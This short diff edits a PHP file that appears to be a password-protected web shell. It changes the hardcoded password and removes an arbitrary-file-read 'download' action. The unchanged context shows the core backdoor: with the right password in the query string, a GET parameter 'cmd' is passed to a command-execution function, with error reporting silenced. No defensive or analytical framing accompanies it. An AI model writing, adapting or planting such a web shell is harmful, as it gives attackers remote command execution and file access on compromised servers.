@@ -2,7 +2,7 @@
 
 error_reporting(0);
 
-$password = "12345";
+$password = "p455w0rd123";
 $get_password = $_GET["password"];
 $cmd = $_GET["cmd"];
 $aksi = $_GET["aksi"];
@@ -63,12 +63,6 @@ if($password === $get_password)
         echo "Software\t\t: ". $sof . "\n";
 
     }
-    else if($aksi == "download")
-    {
-        header('Content-Type: text/plain');
-        $file = $_GET["file"];
-        echo file_get_contents($file);
-    }
     else
     {
         echo trim(exe($cmd));
@@ -84,6 +78,3 @@ else
 {
 	echo "false";
 }
-
-
-
